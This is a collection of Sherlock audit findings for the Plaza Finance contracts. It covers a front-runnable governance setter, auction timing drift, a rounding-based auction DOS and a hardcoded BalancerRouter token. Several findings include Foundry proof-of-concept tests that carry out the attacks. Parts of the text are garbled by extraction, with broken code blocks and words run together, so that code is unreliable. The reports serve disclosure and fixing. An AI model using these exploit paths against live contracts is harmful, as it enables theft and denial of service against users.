# IssueM-5: Wrong modifier on PreDeposit::setBondAndLeverageAmount function leads to big differences in user balances

**Severity:** medium
**Auditor:** Sherlock
**Protocol:** Plaza Finance
**Keywords:** PreDeposit, setBondAndLeverageAmount, modifier, frontrun, backrun, governance, user balances, reserve tokens, deposit phase, withdraw, token distribution, coupon tokens, smart contract, blockchain, market state, unfairness, attack vector, security, vulnerability, audit

---

# IssueM-5: Wrong modifier on PreDeposit::setBondAndLeverageAmount function leads to big differences in user balances

Source: [GitHub Issue #353](https://github.com/sherlock-audit/2024-12-plaza-finance-judging/issues/353)  
Found by: 0xadrii, 0xl33, ZoA  


PreDeposit::setBondAndLeverageAmount function has checkDepositNotEnded modifier, which means it can only be called while deposit phase has not ended yet. The problem with this is that users are free to call PreDeposit::deposit and PreDeposit::withdraw around the time of this function being called by governance, meaning that setBondAndLeverageAmount function can be frontrun/backrun by a griefer. Consider this scenario:

1. Griefer deposits big amount of reserve tokens while deposit phase is active
2. Regular users deposit while deposit phase is active
3. Governance calls setBondAndLeverageAmount function at the end of deposit phase
4. Griefer frontruns the transaction and calls withdraw, inputting the same amount that they deposited before
5. Griefer\u0027s transaction executes, reducing PreDeposit contract\u0027s balance of reserve tokens by a lot
6. Governance\u0027s transaction executes, setting bondAmount and leverageAmount to values that were correct before the withdrawal happened, but not correct anymore, because reserve token balance is much smaller now
7. Deposit phase ends and governance is not able to call setBondAndLeverageAmount function anymore, due to the modifier mentioned previously
8. Pool gets created
9. Users who deposited in PreDeposit claim their tokens
10. New users call Pool::create and receive very different amounts of tokens than users who deposited in PreDeposit, due to total supplies of bondETH and levETH being inflated
11. Big differences in bondETH balances lead to users receiving different amounts of coupon tokens during distribution, due to sharesPerToken being the same for everyone
You can see the scenario described above in the PoC section. Other scenarios can happen too, such as a late user calling \u0060PreDeposit::deposit\u0060 function at the last possible moment, after governance already called \u0060setBondAndLeverageAmount\u0060, but I think one scenario is enough to showcase this issue. 

Additional note: frontrunning in this scenario doesn\u0027t have to be intentional. Same result will be achieved if a regular user decides to withdraw at the same time as governance calls \u0060setBondAndLeverageAmount\u0060. It should not matter whether an attacker or a regular user makes the withdrawal, the issue exists and is possible. Additionally, due to the nature of blockchains, the attacker\u0027s transaction can be executed earlier than governance\u0027s just by pure luck and that will have consequences as described in this finding report.


Root cause - wrong modifier on \u0060setBondAndLeverageAmount\u0060 function.  
[Link to Code](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/PreDeposit.sol#L204)

Modifier in question:

\u0060\u0060\u0060solidity
modifier checkDepositNotEnded() {
    if (block.timestamp >= depositEndTime) revert DepositEnded();
    _;
}
\u0060\u0060\u0060


Governance has to call \u0060setBondAndLeverageAmount\u0060 function just before the deposit phase ends, which I think is likely, because if they call it earlier, they would have to call it again if any users call deposit or withdraw during that time.


None.


Described in Summary section.


This issue leads to incorrect total supplies of bond ETH and lev ETH (unhealthy market state), big differences in user token balances and unfairness during coupon distribution.

1. Create a new file in the test folder and name it \u0060TestSetBondAndLeverageAmount.t.sol\u0060
2. Paste the code provided below into the file:

   \u0060\u0060\u0060solidity
   // SPDX-License-Identifier: UNLICENSED
   pragma solidity ^0.8.24;
   import "forge-std/Test.sol";
   import {Pool} from "../src/Pool.sol";
   import {Token} from "./mocks/Token.sol";
   import {Utils} from "../src/lib/Utils.sol";
   import {BondToken} from "../src/BondToken.sol";
   import {PreDeposit} from "../src/PreDeposit.sol";
   import {Distributor} from "../src/Distributor.sol";
   import {PoolFactory} from "../src/PoolFactory.sol";
   import {Deployer} from "../src/utils/Deployer.sol";
   import {LeverageToken} from "../src/LeverageToken.sol";
   import {UpgradeableBeacon} from "@openzeppelin/contracts/proxy/beacon/UpgradeableBeacon.sol";
   import {OwnableUpgradeable} from "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
   import {PausableUpgradeable} from "@openzeppelin/contracts-upgradeable/utils/PausableUpgradeable.sol";
   import {OracleFeeds} from "../src/OracleFeeds.sol";
   import {MockPriceFeed} from "./mocks/MockPriceFeed.sol";

   contract TestSetBondAndLeverageAmount is Test {
       PreDeposit public preDeposit;
       Token public reserveToken;
       Token public couponToken;
       address user1 = address(2);
       address user2 = address(3);
       address nonOwner = address(4);
       PoolFactory private poolFactory;
       PoolFactory.PoolParams private params;
       Distributor private distributor;
       address private deployer = address(0x5);
       address private minter = address(0x6);
       address private governance = address(0x7);
       address public constant ethPriceFeed = address(0x71041dddad3595F9CEd3DcCFBe3D1F4b0a16Bb70);
   \u0060\u0060\u0060
uint256 constant INITIAL_BALANCE = 1000 ether;
uint256 constant RESERVE_CAP = 100 ether;
uint256 constant DEPOSIT_AMOUNT = 10 ether;
uint256 constant BOND_AMOUNT = 50 ether;
uint256 constant LEVERAGE_AMOUNT = 50 ether;
address private oracleFeedsContract;
MockPriceFeed private mockPriceFeed;
uint256 private constant CHAINLINK_DECIMAL_PRECISION = 10 ** 8;
uint8 private constant CHAINLINK_DECIMAL = 8;

function setUp() public {
    // Set block time to 10 days in the future to avoid block.timestamp to
    // start from 0
    vm.warp(block.timestamp + 10 days);
    vm.startPrank(governance);
    reserveToken = new Token("Wrapped ETH", "WETH", false);
    couponToken = new Token("USDC", "USDC", false);
    vm.stopPrank();
    setUp_PoolFactory();
    vm.startPrank(governance);
    params = PoolFactory.PoolParams({
        fee: 0,
        reserveToken: address(reserveToken),
        couponToken: address(couponToken),
        distributionPeriod: 90 days,
        sharesPerToken: 2 * 10 ** 6,
        feeBeneficiary: address(0)
    });
    preDeposit = PreDeposit(
        Utils.deploy(
            address(new PreDeposit()),
            abi.encodeCall(
                PreDeposit.initialize,
                (
                    params,
                    address(poolFactory),
                    block.timestamp,
                    block.timestamp + 7 days,
                    RESERVE_CAP,
                    "",
                    "",
                    "",
                    ""
                )
            )
        )
    );
}
\u0060\u0060\u0060solidity
vm.stopPrank();
vm.startPrank(deployer);
OracleFeeds(oracleFeedsContract).setPriceFeed(params.reserveToken,
    address(0), ethPriceFeed, 99 days);
// Deploy the mock price feed
mockPriceFeed = new MockPriceFeed();
// Use vm.etch to deploy the mock contract at the specific address
bytes memory bytecode = address(mockPriceFeed).code;
vm.etch(ethPriceFeed, bytecode);
// Set oracle price
mockPriceFeed = MockPriceFeed(ethPriceFeed);
mockPriceFeed.setMockPrice(3000 * int256(CHAINLINK_DECIMAL_PRECISION),
    uint8(CHAINLINK_DECIMAL));
vm.stopPrank();
vm.startPrank(governance);
poolFactory.grantRole(poolFactory.POOL_ROLE(), governance);
vm.stopPrank();
}

function setUp_PoolFactory() internal {
    vm.startPrank(deployer);
    address contractDeployer = address(new Deployer());
    oracleFeedsContract = address(new OracleFeeds());
    address poolBeacon = address(new UpgradeableBeacon(address(new Pool(),
        governance));
    address bondBeacon = address(new UpgradeableBeacon(address(new
        BondToken()), governance));
    address levBeacon = address(new UpgradeableBeacon(address(new
        LeverageToken()), governance));
    address distributorBeacon = address(new UpgradeableBeacon(address(new
        Distributor()), governance));
    poolFactory = PoolFactory(
        Utils.deploy(
            address(new PoolFactory()),
            abi.encodeCall(
                PoolFactory.initialize,
                59
\u0060\u0060\u0060
\u0060\u0060\u0060solidity
(
    governance,
    contractDeployer,
    oracleFeedsContract,
    poolBeacon,
    bondBeacon,
    levBeacon,
    distributorBeacon
)
)
)
);
vm.stopPrank();
}
function testAttackerFrontrunsSetBondAndLeverageAmountCall() public {
    uint256 maliciousUserAmount = 50 ether;
    address maliciousUser = makeAddr("malicious user");
    uint256 regularUserAmount = 1 ether;
    uint256 numberOfRegularUsers = 50;
    address[50] memory users;
    uint256 exampleBondAmount = 1500 ether;
    uint256 exampleLevAmount = 1500 ether;
    Pool.TokenType tokenTypeBond = Pool.TokenType.BOND;
    Pool.TokenType tokenTypeLev = Pool.TokenType.LEVERAGE;
    address[50] memory users2;
    // creating addresses for users
    for (uint256 i = 0; i < numberOfRegularUsers; i++) {
        users[i] = address(uint160(uint256(keccak256(abi.encodePacked(i +
        999)))));
        users2[i] = address(uint160(uint256(keccak256(abi.encodePacked(i +
        9999)))));
    }
    // malicious user deposits 50 ether
    vm.startPrank(maliciousUser);
    reserveToken.mint(maliciousUser, maliciousUserAmount);
    reserveToken.approve(address(preDeposit), maliciousUserAmount);
    preDeposit.deposit(maliciousUserAmount);
    vm.stopPrank();
    // all users deposit 1 ether each
    for (uint256 i = 0; i < numberOfRegularUsers; i++) {
        vm.startPrank(users[i]);
        reserveToken.mint(users[i], regularUserAmount);
        reserveToken.approve(address(preDeposit), regularUserAmount);
        preDeposit.deposit(regularUserAmount);
        vm.stopPrank();
\u0060\u0060\u0060
vm.warp(block.timestamp + 604784); // 6.999 days pass (almost end of deposit phase)  
vm.startPrank(maliciousUser);  
preDeposit.withdraw(maliciousUserAmount); // malicious user frontruns \u0060setBondAndLeverageAmount\u0060 call to decrease reserve token balance  
vm.stopPrank();  
vm.startPrank(governance);  
preDeposit.setBondAndLeverageAmount( // setting both amounts to 1500e18 just before deposit phase ends (governance decides amounts based on reserve token balance)  
exampleBondAmount, exampleLevAmount);  
// now bond/leverage amounts should be 750e18, since malicious user withdrew 50% of reserve token balance, but amounts get set to 1500e18  
vm.warp(block.timestamp + 16); // deposit phase ends  
// governance trying to set amounts after deposit phase ended results in revert  
vm.expectRevert();  
preDeposit.setBondAndLeverageAmount((exampleBondAmount - 750e18), (exampleLevAmount - 750e18));  
// the token amounts are wrong, because they don\u0027t match reserve token balance, but pool must be created, because there\u0027s no other way to get the user funds out or change the amounts  
poolFactory.grantRole(poolFactory.POOL_ROLE(), address(preDeposit));  
preDeposit.createPool(); // pool gets created, this contract gets minted too big amount of bond/leverage tokens  
address pool = preDeposit.pool();  
poolFactory.grantRole(poolFactory.SECURITY_COUNCIL_ROLE(), address(governance));  
Pool(pool).unpause();  
vm.stopPrank();  
address bondToken = address(Pool(preDeposit.pool()).bondToken());  
address levToken = address(Pool(preDeposit.pool()).lToken());  
// all users claim their tokens  
for (uint256 i = 0; i < numberOfRegularUsers; i++) {  
    vm.startPrank(users[i]);  
    preDeposit.claim();  
    vm.stopPrank();  
    console.log("user balance of bond token after claim:", BondToken(bondToken).balanceOf(users[i])); // 30000000000000000000 = 30e18  
}
console.log("user balance of lev token after claim:",
            LeverageToken(levToken).balanceOf(users[i])); // 30000000000000000000 = 30e18
                   }
                   // new users use same amount of reserve tokens as previous users in
            \u0060PreDeposit\u0060 to create bond/lev tokens
                   // they all receive very odd amounts that don\u0027t match the amounts of users
            who deposited in \u0060PreDeposit\u0060
                   // p.s. if you scroll up and change \u0060exampleBondAmount\u0060 and
            \u0060exampleLevAmount\u0060 to 750e18 and run this test again, you will see that the
            users below get same amounts as previous users and everything is normal
                   for (uint256 i = 0; i < numberOfRegularUsers; i++) {
                       vm.startPrank(users2[i]);
                       reserveToken.mint(users2[i], regularUserAmount);
                       reserveToken.approve(pool, regularUserAmount);
                       Pool(pool).create(tokenTypeBond, 0.5 ether, 0);
                       Pool(pool).create(tokenTypeLev, 0.5 ether, 0);
                       vm.stopPrank();
                       console.log("user2 balance of bond token after create:",
            BondToken(bondToken).balanceOf(users2[i]));
                       console.log("user2 balance of lev token after create:",
            LeverageToken(levToken).balanceOf(users2[i]));
                   }
               }
           }
             3. Runthetestusingthiscommand: forge test --mt
                testAttackerFrontrunsSetBondAndLeverageAmountCall -vv
             4. Takealookatthelogsshownintheterminal. Youwillseeuserbalancesoftokens
                whodepositedinPreDepositandthenafterthatyouwillseeuserbalancesof
                tokenswhocalledPool::createafterpoolwascreated.
             5. Asyoucanseeinthisexamplescenario,thebalancesareobviouslyverydifferent,
                andthatconfirmstheissue.
          Mitigation
          SimplychangethemodifieronsetBondAndLeverageAmountfunctionfrom
          checkDepositNotEndedtocheckDepositEnded,toallowgovernancetocallthisfunction
          after deposit phasehasendedandtosetthecorrectvalues. Thiswillensureusers
          cannotchangethereservetokenbalancearoundthetimeofthisfunctionbeingcalled.
           function setBondAndLeverageAmount(
                   uint256 _bondAmount,
                   uint256 _leverageAmount
           -   ) external onlyOwner checkDepositNotEnded {

\u0060\u0060\u0060solidity
) external onlyOwner checkDepositEnded {
\u0060\u0060\u0060

The protocol team fixed this issue in the following PRs/commits:  
[https://github.com/Convexity-Research/plaza-evm/pull/160](https://github.com/Convexity-Research/plaza-evm/pull/160)
## Issue M-6: Auction date will drift irreversibly forward

Source: [GitHub Issue #446](https://github.com/sherlock-audit/2024-12-plaza-finance-judging/issues/446)  
Found by: 0x52  

During the creation of the auction, \u0060lastDistribution\u0060 is set to \u0060block.timestamp\u0060. Delays are compounding and will lead to loss of yield over time as the subsequent distribution will be delayed.

\u0060\u0060\u0060solidity
function startAuction() external whenNotPaused() {
    // Check if distribution period has passed
    require(lastDistribution + distributionPeriod < block.timestamp,
    DistributionPeriodNotPassed());
    // Check if auction period hasn\u0027t passed
    require(lastDistribution + distributionPeriod + auctionPeriod >=
    block.timestamp, AuctionPeriodPassed());
    ... SNIP
    // Update last distribution time
    lastDistribution = block.timestamp;
}
\u0060\u0060\u0060

Above we see that \u0060lastDistribution\u0060 is used to determine if the auction can be started. Additionally, \u0060lastDistribution\u0060 is set to \u0060block.timestamp\u0060 which means that any delay between \u0060lastDistribution + distributionPeriod\u0060 and \u0060block.timestamp\u0060 will cause loss of yield in the subsequent quarter.

According to Sherlock rules a loss of 0.01% qualifies as medium impact. The distribution period is 1 quarter or 90 days which is 7776000 seconds. This means that a delay of 777.6 seconds (13 minutes) will break this threshold. Given that the start of the auction is expected to be within \u0060lastDistribution + distributionPeriod + auctionPeriod\u0060, it is reasonable to assume that in real world conditions that a delay of this magnitude can and will happen.
Pool.sol set lastDistribution == block.timestamp

None

startAuction is delayed by at least 777.6 seconds

N/A

Loss of yield for bondholders

N/A

Instead of setting lastDistribution to block.timestamp it should be set to lastDistribution + distributionPeriod

sherlock-admin2  
The protocol team fixed this issue in the following PRs/commits:  
[https://github.com/Convexity-Research/plaza-evm/pull/163](https://github.com/Convexity-Research/plaza-evm/pull/163)
## IssueM-7: Rounding loss in Auction#slotSize allows malicious user to force auction to be undersold

Source: [GitHub Issue](https://github.com/sherlock-audit/2024-12-plaza-finance-judging/issues/449)  
Found by: 0x52, 0xloophole, ZoA, bladeee, moray5554

When an auction reaches the max number of bids it begins rolling the lowest bids off the list. To prevent high price low value bids from spamming out legitimate bids it enforces that the bid is an even division of slotSize(). This protection is not complete due to precision loss in its calculation. If a malicious user spams max number of bids of size == slotSize(), they can force an underfunded auction to occur, DOS\u0027ing users and preventing funding.

Auction.sol does not account for precision loss allowing it to be exploited

None

None

1. Spam max bids at size == slotSize
2. Wait for auction to end
3. End auction in failure
4. Refund all bids

Bond payments can be indefinitely DOS\u0027d due to forcing auctions to fail.

Tests for all vulnerabilities can be found here.  
Insert the following test into Pool.t.sol

\u0060\u0060\u0060solidity
function testDOSAuction() public {
    //test setup
    Token rToken = Token(params.reserveToken);
    Token cToken = Token(params.couponToken);
    vm.prank(user);
    address auction = Utils.deploy(
        address(new Auction()),
        abi.encodeWithSelector(
            Auction.initialize.selector,
            address(cToken),
            address(rToken),
            5000e6 + 1,
            block.timestamp + 1 days,
            10, // max bids set to 10 for simplicity of the test
            address(this),
            90
        )
    );
    cToken.mint(user, 1e18);
    cToken.mint(user2, 1e18);
    vm.prank(user);
    cToken.approve(auction, type(uint256).max);
    vm.prank(user2);
    cToken.approve(auction, type(uint256).max);
    vm.prank(user);
    Auction(auction).bid(1e6, 5000e6);
    for(uint i=0; i<10; i++){
        vm.prank(user2);
        Auction(auction).bid(0.05e6, 500e6);
    }
    vm.warp(Auction(auction).endTime());
    Auction(auction).endAuction();
    // auction has received a total of 10000e6 worth of bids but still fails due to
    // rounding error
    assert(Auction(auction).state() == Auction.State.FAILED_UNDERSOLD);
}
\u0060\u0060\u0060
Output:
\u0060\u0060\u0060
[PASS] testDOSAuction()
\u0060\u0060\u0060
In the above test the auction receives a total of 10000e6 worth of bids but still fails as UNDERSOLD due to the issues described above.

slotSize() should be totalBuyCouponAmount / maxBids + 1 rather than totalBuyCouponAmount / maxBids

sherlock-admin2

The protocol team fixed this issue in the following PRs/commits:
https://github.com/Convexity-Research/plaza-evm/pull/166
## IssueM-8: BalancerRouter is implemented incorrectly and will cause loss of funds when depositing to pre-deposits

Source: [GitHub Issue](https://github.com/sherlock-audit/2024-12-plaza-finance-judging/issues/455)

This issue has been acknowledged by the team but won\u0027t be fixed at this time.

Found by  
0x52, wellbyt3


The balancerRouter is intended to work with multiple balancer pools but is implemented incorrectly and can only work correctly with a single pool. This is because the balancerPoolToken is hardcoded to a single pool token. This makes the balanceOf check highly dangerous when depositing to preDeposit contracts. Only the hardcoded token balance is checked, causing all of the desired BPT to become stuck. This will result in user funds becoming permanently lost.

\u0060\u0060\u0060solidity
// BalancerRouter.sol
IVault public immutable balancerVault;
IERC20 public immutable balancerPoolToken;

constructor(address _balancerVault, address _balancerPoolToken) {
    balancerVault = IVault(_balancerVault);
    balancerPoolToken = IERC20(_balancerPoolToken);
}
\u0060\u0060\u0060

We see above that balancerPoolToken is an immutable variable set during construction.

\u0060\u0060\u0060solidity
// BalancerRouter.sol
function joinBalancerPool(
    bytes32 poolId,
    IAsset[] memory assets,
    uint256[] memory maxAmountsIn,
    bytes memory userData
) internal returns (uint256) {
    ... SNIP
    // Join Balancer pool
    uint256 balancerPoolTokenBalanceBefore = balancerPoolToken.balanceOf(address(this));
}
\u0060\u0060\u0060
\u0060\u0060\u0060solidity
balancerVault.joinPool(poolId, address(this), address(this), request);
uint256 balancerPoolTokenBalanceAfter =
    balancerPoolToken.balanceOf(address(this));
return balancerPoolTokenBalanceAfter - balancerPoolTokenBalanceBefore;
\u0060\u0060\u0060

We see that when depositing it will always check the hardcoded address rather than the proper token. This means that it will return 0 when trying to deposit to other pools.

\u0060\u0060\u0060solidity
function joinBalancerAndPredeposit(
    bytes32 balancerPoolId,
    address _predeposit,
    IAsset[] memory assets,
    uint256[] memory maxAmountsIn,
    bytes memory userData
) external nonReentrant returns (uint256) {
    // Step 1: Join Balancer Pool
    uint256 balancerPoolTokenReceived = joinBalancerPool(balancerPoolId,
        assets, maxAmountsIn, userData);
    // Step 2: Approve balancerPoolToken for PreDeposit
    balancerPoolToken.safeIncreaseAllowance(_predeposit,
        balancerPoolTokenReceived);
    // Step 3: Deposit to PreDeposit
    PreDeposit(_predeposit).deposit(balancerPoolTokenReceived, msg.sender);
    return balancerPoolTokenReceived;
}
\u0060\u0060\u0060

As a result of this, balancerPoolTokenReceived will be 0. This will cause the tokens to be permanently stuck in the router causing complete loss of funds to the user.

balancerPoolToken is hardcoded.

None

None
## AttackPath
N/A
## Impact
Completelossofuserfunds

N/A

balancerPoolTokenshouldberetrieveddynamicallyfromthevault.
